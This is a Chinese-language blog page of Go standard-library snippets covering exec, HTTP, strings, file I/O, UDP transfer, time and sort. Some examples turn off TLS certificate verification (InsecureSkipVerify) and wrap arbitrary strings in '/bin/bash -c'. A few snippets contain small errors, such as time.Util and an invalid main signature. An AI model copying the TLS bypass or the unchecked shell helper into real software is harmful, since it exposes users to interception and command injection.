<h2 id="5-os-exec-命令行调用"><a href="#5-os-exec-命令行调用" class="headerlink" title="5. os&#x2F;exec 命令行调用"></a>5. os&#x2F;exec 命令行调用</h2><h3 id="5-1-阻塞式等待返回，并输出stdout"><a href="#5-1-阻塞式等待返回，并输出stdout" class="headerlink" title="5.1. 阻塞式等待返回，并输出stdout"></a>5.1. 阻塞式等待返回，并输出stdout</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bytes&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">execShell</span><span class="params">(s <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    cmd := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> out bytes.Buffer</span><br><span class="line">    cmd.Stdout = &amp;out</span><br><span class="line"></span><br><span class="line">    err := cmd.Run()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%v\n&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out.String(), err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(execShell(<span class="string">&quot;ls /&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-net-http-http网络请求库"><a href="#6-net-http-http网络请求库" class="headerlink" title="6. net&#x2F;http http网络请求库"></a>6. net&#x2F;http http网络请求库</h2><h3 id="6-1-发送post请求"><a href="#6-1-发送post请求" class="headerlink" title="6.1. 发送post请求"></a>6.1. 发送post请求</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	resp, err := http.Post(<span class="string">&quot;https://1.1.1.1:1234/a/b&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, strings.NewReader(<span class="string">&quot;mobileId=!@#$%^&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">    body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-2-忽略https的证书错误"><a href="#6-2-忽略https的证书错误" class="headerlink" title="6.2. 忽略https的证书错误"></a>6.2. 忽略https的证书错误</h3><h4 id="1-修改默认客户端"><a href="#1-修改默认客户端" class="headerlink" title="(1) 修改默认客户端"></a>(1) 修改默认客户端</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">    <span class="string">&quot;crypto/tls&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.DefaultClient.Transport = &amp;http.Transport&#123;</span><br><span class="line">        TLSClientConfig: &amp;tls.Config&#123;</span><br><span class="line">            InsecureSkipVerify: <span class="literal">true</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	resp, err := http.Post(<span class="string">&quot;https://1.1.1.1:1234/a/b&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, strings.NewReader(<span class="string">&quot;mobileId=!@#$%^&quot;</span>))</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-3-302不跳转"><a href="#6-3-302不跳转" class="headerlink" title="6.3. 302不跳转"></a>6.3. 302不跳转</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	tr := http.Transport&#123;</span><br><span class="line">		TLSClientConfig: &amp;tls.Config&#123;</span><br><span class="line">			InsecureSkipVerify: <span class="literal">true</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	c := http.Client&#123;</span><br><span class="line">		Transport: &amp;tr,</span><br><span class="line">		CheckRedirect: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request, via []*http.Request)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">			<span class="comment">// 返回这个错误，302就不会继续跳转</span></span><br><span class="line">			<span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	resp, err := c.Get(<span class="string">&quot;https://10.240.17.108:8080&quot;</span>)</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-4-获取tcp的四元组"><a href="#6-4-获取tcp的四元组" class="headerlink" title="6.4. 获取tcp的四元组"></a>6.4. 获取tcp的四元组</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 修改DialContext才能拿到连接信息，将conn返回前赋值给conn变量</span></span><br><span class="line">	<span class="keyword">var</span> conn net.Conn</span><br><span class="line">	<span class="keyword">var</span> connLock sync.Mutex</span><br><span class="line">	tr := http.Transport&#123;</span><br><span class="line">		TLSClientConfig: &amp;tls.Config&#123;</span><br><span class="line">			InsecureSkipVerify: <span class="literal">true</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">		DialContext: <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, network, addr <span class="type">string</span>)</span></span> (net.Conn, <span class="type">error</span>) &#123;</span><br><span class="line">			<span class="keyword">var</span> dialer net.Dialer</span><br><span class="line">			c, err := dialer.DialContext(ctx, network, addr)</span><br><span class="line">			<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">				connLock.Lock()</span><br><span class="line">				conn = c</span><br><span class="line">				connLock.Unlock()</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> c, err</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c := http.Client&#123; Transport: &amp;tr &#125;</span><br><span class="line">	c.Get(<span class="string">&quot;https://10.240.17.108:8080&quot;</span>)</span><br><span class="line">	connLock.Lock()</span><br><span class="line">	fmt.Println(conn.LocalAddr().String(), conn.RemoteAddr().String())</span><br><span class="line">	connLock.Unlock()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-strings-字符串操作库"><a href="#7-strings-字符串操作库" class="headerlink" title="7. strings 字符串操作库"></a>7. strings 字符串操作库</h2><h3 id="7-1-字符串替换"><a href="#7-1-字符串替换" class="headerlink" title="7.1. 字符串替换"></a>7.1. 字符串替换</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	outStr := <span class="string">&#x27;&#123;&quot;a&quot;:&quot;123&quot;&#125;&#x27;</span></span><br><span class="line">	<span class="comment">// 将json中的双引号全部替换为单引号</span></span><br><span class="line">	outStr = strings.ReplaceAll(outStr, <span class="string">`&quot;`</span>, <span class="string">`&#x27;`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="7-2-裁剪两端字符串"><a href="#7-2-裁剪两端字符串" class="headerlink" title="7.2. 裁剪两端字符串"></a>7.2. 裁剪两端字符串</h3><ul>
<li>只能裁剪两端的字符串，中间的不会裁剪</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">outStr := <span class="string">&quot;abffffffffabfffffffab&quot;</span></span><br><span class="line">outStr = strings.Trim(outStr, <span class="string">&quot;ab&quot;</span>)		<span class="comment">// ffffffffabfffffff</span></span><br></pre></td></tr></table></figure>

<h3 id="7-3-字符串分割"><a href="#7-3-字符串分割" class="headerlink" title="7.3. 字符串分割"></a>7.3. 字符串分割</h3><p><strong>Split</strong></p>
<ul>
<li>根据某字符串分割</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">arr := strings.Split(<span class="string">&quot;a,b,c&quot;</span>, <span class="string">&quot;,&quot;</span>)	<span class="comment">// [a b c]</span></span><br></pre></td></tr></table></figure>

<p><strong>Fields</strong></p>
<ul>
<li>根据空格分割，多个空格视为一个</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">arr := strings.Fields(<span class="string">&quot;a b  c   d&quot;</span>) <span class="comment">// [a b c d]</span></span><br></pre></td></tr></table></figure>

<h3 id="7-4-字符串比较"><a href="#7-4-字符串比较" class="headerlink" title="7.4. 字符串比较"></a>7.4. 字符串比较</h3><p><strong>Compare</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> strings.Compare(event1[<span class="number">1</span>], event2[<span class="number">0</span>]) &lt; <span class="number">0</span> &#123;</span><br><span class="line">	<span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="8-encoding-hex-十六进制操作库"><a href="#8-encoding-hex-十六进制操作库" class="headerlink" title="8. encoding&#x2F;hex 十六进制操作库"></a>8. encoding&#x2F;hex 十六进制操作库</h2><h3 id="8-1-将十六进制字符串转成数组"><a href="#8-1-将十六进制字符串转成数组" class="headerlink" title="8.1. 将十六进制字符串转成数组"></a>8.1. 将十六进制字符串转成数组</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">arr, err := hex.DecodeString(<span class="string">&quot;aabbcc&quot;</span>)	<span class="comment">// [170 187 204]</span></span><br></pre></td></tr></table></figure>

<h3 id="8-2-将-byte按照十六进制打印成字符串"><a href="#8-2-将-byte按照十六进制打印成字符串" class="headerlink" title="8.2. 将[]byte按照十六进制打印成字符串"></a>8.2. 将[]byte按照十六进制打印成字符串</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">hexStr := hex.EncodeToString([]<span class="type">byte</span>(<span class="string">&quot;123456&quot;</span>))	<span class="comment">// 313233343536</span></span><br></pre></td></tr></table></figure>

<h2 id="9-io-ioutil-io操作（到go1-16之后可以使用io或os库替代）"><a href="#9-io-ioutil-io操作（到go1-16之后可以使用io或os库替代）" class="headerlink" title="9. io&#x2F;ioutil io操作（到go1.16之后可以使用io或os库替代）"></a>9. io&#x2F;ioutil io操作（到go1.16之后可以使用io或os库替代）</h2><h3 id="9-1-文件读取"><a href="#9-1-文件读取" class="headerlink" title="9.1. 文件读取"></a>9.1. 文件读取</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">contentBytes, err := ioutil.ReadFile(<span class="string">&quot;/a/b/c.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="10-os-系统操作"><a href="#10-os-系统操作" class="headerlink" title="10. os 系统操作"></a>10. os 系统操作</h2><h3 id="10-1-目录操作"><a href="#10-1-目录操作" class="headerlink" title="10.1. 目录操作"></a>10.1. 目录操作</h3><h4 id="1-基本操作"><a href="#1-基本操作" class="headerlink" title="1) 基本操作"></a>1) 基本操作</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断目录是否存在</span></span><br><span class="line">_, err := os.Stat(<span class="string">&quot;./&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; os.IsNotExist(err) &#123;</span><br><span class="line">	<span class="comment">// 目录不存在</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前二进制执行路径</span></span><br><span class="line">execFilePath, _ := os.Executable()</span><br><span class="line">fmt.Println(execFilePath)	<span class="comment">// /home/xxx/local/go/tools/tool</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取temp目录路径</span></span><br><span class="line">os.TempDir()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 切换工作目录</span></span><br><span class="line">err := os.Chdir(<span class="string">&quot;/tmp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建目录</span></span><br><span class="line">err := os.Mkdir(currentPath+<span class="string">&quot;/tmp&quot;</span>, <span class="number">0777</span>)			<span class="comment">// 类似mkdir xxx/tmp</span></span><br><span class="line">err := os.MkdirAll(currentPath+<span class="string">&quot;/tmp/a/b&quot;</span>, <span class="number">0777</span>)	<span class="comment">// 类似mkdir -p xxx/tmp/a/b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除目录</span></span><br><span class="line">err := os.Remove(currentPath + <span class="string">&quot;/tmp&quot;</span>)		<span class="comment">// 删除文件或空文件夹</span></span><br><span class="line">err := os.RemoveAll(currentPath + <span class="string">&quot;/tmp&quot;</span>)	<span class="comment">// 删除目录及其子目录</span></span><br></pre></td></tr></table></figure>

<h3 id="10-2-文件操作"><a href="#10-2-文件操作" class="headerlink" title="10.2. 文件操作"></a>10.2. 文件操作</h3><h4 id="1-整个文件读取"><a href="#1-整个文件读取" class="headerlink" title="1) 整个文件读取"></a>1) 整个文件读取</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">contentBytes, err := os.ReadFile(<span class="string">&quot;/a/b/c.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="2-按行读取"><a href="#2-按行读取" class="headerlink" title="2) 按行读取"></a>2) 按行读取</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *defaultParser)</span></span> ParseFile(filePath <span class="type">string</span>, handler <span class="function"><span class="keyword">func</span><span class="params">(log <span class="type">string</span>)</span></span>) &#123;</span><br><span class="line">	f, err := os.Open(filePath)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line">	rd := bufio.NewReader(f)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		line, err := rd.ReadString(<span class="string">&#x27;\n&#x27;</span>) <span class="comment">//以&#x27;\n&#x27;为结束符读入一行</span></span><br><span class="line">		fmt.Println(line)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> || io.EOF == err &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-写入文件"><a href="#3-写入文件" class="headerlink" title="3) 写入文件"></a>3) 写入文件</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	f, err := os.OpenFile(outpath, os.O_WRONLY|os.O_CREATE, <span class="number">0644</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> f.Close()</span><br><span class="line">	nw, err := f.Write(buf.Bytes())</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> nw != buf.Len() &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Errorf(<span class="string">&quot;need to write %d, but write %d&quot;</span>, buf.Len(), nw))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="11-stronv"><a href="#11-stronv" class="headerlink" title="11. stronv"></a>11. stronv</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 使用ParseFloat解析浮点数，64是说明使用多少位</span></span><br><span class="line">    <span class="comment">// 精度来解析</span></span><br><span class="line">    f, _ := strconv.ParseFloat(<span class="string">&quot;1.234&quot;</span>, <span class="number">64</span>)</span><br><span class="line">    fmt.Println(f)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对于ParseInt函数，0 表示从字符串推断整型进制，</span></span><br><span class="line">    <span class="comment">// 则表示返回结果的位数</span></span><br><span class="line">    i, _ := strconv.ParseInt(<span class="string">&quot;123&quot;</span>, <span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line">    fmt.Println(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ParseInt能够解析出16进制的数字</span></span><br><span class="line">    d, _ := strconv.ParseInt(<span class="string">&quot;0x1c8&quot;</span>, <span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line">    fmt.Println(d)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 还可以使用ParseUint函数</span></span><br><span class="line">    u, _ := strconv.ParseUint(<span class="string">&quot;789&quot;</span>, <span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line">    fmt.Println(u)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Atoi是解析10进制整型的快捷方法</span></span><br><span class="line">    k, _ := strconv.Atoi(<span class="string">&quot;135&quot;</span>)</span><br><span class="line">    fmt.Println(k)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析函数在遇到无法解析的输入时，会返回错误</span></span><br><span class="line">    _, e := strconv.Atoi(<span class="string">&quot;wat&quot;</span>)</span><br><span class="line">    fmt.Println(e)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="12-net-网络库"><a href="#12-net-网络库" class="headerlink" title="12. net 网络库"></a>12. net 网络库</h2><h3 id="12-1-udp发送和接受"><a href="#12-1-udp发送和接受" class="headerlink" title="12.1. udp发送和接受"></a>12.1. udp发送和接受</h3><p><strong>客户端</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag.Parse()</span><br><span class="line">	<span class="keyword">if</span> flag.NArg() &lt; <span class="number">2</span> &#123;</span><br><span class="line">		log.Fatalln(<span class="string">&quot;Must input 2 params&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	serverAddr := flag.Arg(<span class="number">0</span>)</span><br><span class="line">	filePath := flag.Arg(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;client, serverAddr: %s, filePath: %s\r\n&quot;</span>, serverAddr, filePath)</span><br><span class="line"></span><br><span class="line">	conn, err := net.Dial(<span class="string">&quot;udp&quot;</span>, serverAddr)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> conn.Close()</span><br><span class="line"></span><br><span class="line">	f, err := os.Open(filePath)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">50</span>*<span class="number">1024</span>)</span><br><span class="line">	count := <span class="number">0</span></span><br><span class="line">	i := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		n, err := f.Read(buf)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				log.Fatalln(err)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		sendSize, err := conn.Write(buf[:n])</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatalln(err)</span><br><span class="line">		&#125;</span><br><span class="line">		count += sendSize</span><br><span class="line"></span><br><span class="line">		msg := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">128</span>)</span><br><span class="line">		_, err = conn.Read(msg)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatalln(err)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		fmt.Printf(<span class="string">&quot;%d, Send %d, check %s\r\n&quot;</span>, i, n, <span class="type">string</span>(msg))</span><br><span class="line">		i++</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;Send %s to %s success, size %d&quot;</span>, serverAddr, filePath, count)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>服务端</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag.Parse()</span><br><span class="line">	<span class="keyword">if</span> flag.NArg() &lt; <span class="number">2</span> &#123;</span><br><span class="line">		log.Fatalln(<span class="string">&quot;Must input 2 params&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	serverAddr := flag.Arg(<span class="number">0</span>)</span><br><span class="line">	filePath := flag.Arg(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;Hello, main, serverAddr: %s, filePath: %s\r\n&quot;</span>, serverAddr, filePath)</span><br><span class="line"></span><br><span class="line">	f, err := os.Create(filePath)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line">	addr, err := net.ResolveUDPAddr(<span class="string">&quot;udp&quot;</span>, serverAddr)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	conn, err := net.ListenUDP(<span class="string">&quot;udp&quot;</span>, addr)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> conn.Close()</span><br><span class="line"></span><br><span class="line">	i := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		data := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">100</span>*<span class="number">1024</span>)</span><br><span class="line">		n, rAddr, err := conn.ReadFromUDP(data)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		fmt.Printf(<span class="string">&quot;%d, Recieved from %s size %d\r\n&quot;</span>, i, rAddr.String(), n)</span><br><span class="line"></span><br><span class="line">		f.Write(data[:n])</span><br><span class="line">		i++</span><br><span class="line"></span><br><span class="line">		_, err = conn.WriteToUDP([]<span class="type">byte</span>(fmt.Sprintf(<span class="string">&quot;%d&quot;</span>, n)), rAddr)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="13-time-时间库"><a href="#13-time-时间库" class="headerlink" title="13. time 时间库"></a>13. time 时间库</h2><h3 id="13-1-基本操作"><a href="#13-1-基本操作" class="headerlink" title="13.1. 基本操作"></a>13.1. 基本操作</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 秒级时间戳</span></span><br><span class="line">	timestampS := time.Now().Unix()</span><br><span class="line">	<span class="comment">// 当前时间向前一天</span></span><br><span class="line">	yestoday := time.Now().Add(<span class="number">-24</span> * time.Hour)</span><br><span class="line">	<span class="comment">// 时间距离当前多久，不受系统时间变化而变化</span></span><br><span class="line">	du := time.Since(yestoday)</span><br><span class="line">	<span class="comment">// 当前到此时间经过多久，不受系统时间变化而变化</span></span><br><span class="line">	du := time.Util(yestoday)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="13-2-时钟说明"><a href="#13-2-时钟说明" class="headerlink" title="13.2. 时钟说明"></a>13.2. 时钟说明</h3><p>参考 <a href="https://zhuanlan.zhihu.com/p/341768740">go中使用单调时钟获得准确的时间间隔</a></p>
<ul>
<li>time结构体记录了墙上时间和单调时间</li>
<li>使用<code>time.Now()</code>获取的会保存墙上时间和单调时间一起，计算Since的时候会使用单调时间进行计算</li>
<li>使用时间字符串得到的不会有单调时间，会随着系统时间变化而变化</li>
</ul>
<h2 id="14-sort-排序"><a href="#14-sort-排序" class="headerlink" title="14. sort 排序"></a>14. sort 排序</h2><h3 id="14-1-基本类型排序"><a href="#14-1-基本类型排序" class="headerlink" title="14.1. 基本类型排序"></a>14.1. 基本类型排序</h3><h4 id="1-升序"><a href="#1-升序" class="headerlink" title="1) 升序"></a>1) 升序</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;sort&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> queryKeyList []<span class="type">string</span></span><br><span class="line">	<span class="keyword">var</span> intList []<span class="type">int</span></span><br><span class="line"></span><br><span class="line">	sort.Strings(queryKeyList)</span><br><span class="line">	sort.Ints(intList)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

